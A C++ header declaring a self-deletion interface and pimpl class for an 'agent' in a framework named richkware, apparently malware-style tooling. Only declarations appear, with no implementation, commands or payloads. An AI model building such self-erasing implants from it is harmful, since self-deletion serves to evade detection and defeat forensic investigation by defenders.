#pragma once

#include "../core/types.hpp"
#include <memory>
#include <string>

namespace richkware::modules {

/**
 * @brief Self-deletion interface for secure agent removal
 */
class ISelfDeletion {
public:
    virtual ~ISelfDeletion() = default;

    /**
     * @brief Schedule self-deletion on process exit
     * @param method Deletion method to use
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> schedule_deletion(
        const std::string& method = "standard") = 0;

    /**
     * @brief Delete agent immediately
     * @return Result indicating success or failure (process will terminate)
     */
    [[nodiscard]] virtual core::Result<void> delete_immediately() = 0;

    /**
     * @brief Check if deletion is scheduled
     * @return true if scheduled, false otherwise
     */
    [[nodiscard]] virtual bool is_deletion_scheduled() const = 0;

    /**
     * @brief Cancel scheduled deletion
     * @return Result indicating success or failure
     */
    [[nodiscard]] virtual core::Result<void> cancel_deletion() = 0;
};

/**
 * @brief Self-deletion implementation
 */
class SelfDeletion : public ISelfDeletion {
public:
    SelfDeletion();
    ~SelfDeletion() override;

    // Non-copyable, movable
    SelfDeletion(const SelfDeletion&) = delete;
    SelfDeletion& operator=(const SelfDeletion&) = delete;
    SelfDeletion(SelfDeletion&&) = default;
    SelfDeletion& operator=(SelfDeletion&&) = default;

    [[nodiscard]] core::Result<void> schedule_deletion(
        const std::string& method = "standard") override;

    [[nodiscard]] core::Result<void> delete_immediately() override;

    [[nodiscard]] bool is_deletion_scheduled() const override;

    [[nodiscard]] core::Result<void> cancel_deletion() override;

private:
    class Impl;
    std::unique_ptr<Impl> pimpl_;
};

} // namespace richkware::modules